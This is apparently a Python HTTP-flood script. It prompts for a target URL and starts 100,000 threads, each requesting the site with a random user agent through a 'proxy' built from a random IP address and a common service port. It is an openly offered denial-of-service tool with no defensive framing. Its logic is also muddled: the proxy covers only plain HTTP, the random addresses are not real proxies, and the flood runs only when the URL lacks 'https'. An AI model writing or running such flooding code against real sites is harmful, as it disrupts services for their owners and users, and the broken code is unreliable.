import os 
from urllib.request import ProxyHandler , build_opener 
import random
import time 
try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent')

import urllib.request
try:
    import threading
except:
    os.system('pip install threading')



def Husin():
    for i in range(1):
        data=('a'*100)
                        
        headers = {
                                        
            'User-Agent': generate_user_agent()
        }
        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
        port = random.choice(pl)
        proxy = ip + ":" + str(port)
        try:
            proxy_handler = ProxyHandler({'http': 'http://' + proxy})
            data_bytes = data.encode('utf-8')
                        
                        
            opener = build_opener(proxy_handler)
            req = opener.open(urllib.request.Request('https://'+url , headers=headers ))

            if req.status == 200:
                print('\033[1;32m'+url+'|'+proxy)
                                
            else:
                print('\033[1;31m'+url +'|'+proxy)
        except:
            print("\033[1;31m ERROR " + url)
                        
def start():
     for i in range(100000):
        threading.Thread(target=Husin).start()

url = input(" \033[1;33mURL :  ")
if 'https' in url:
    pass
else:
    start()

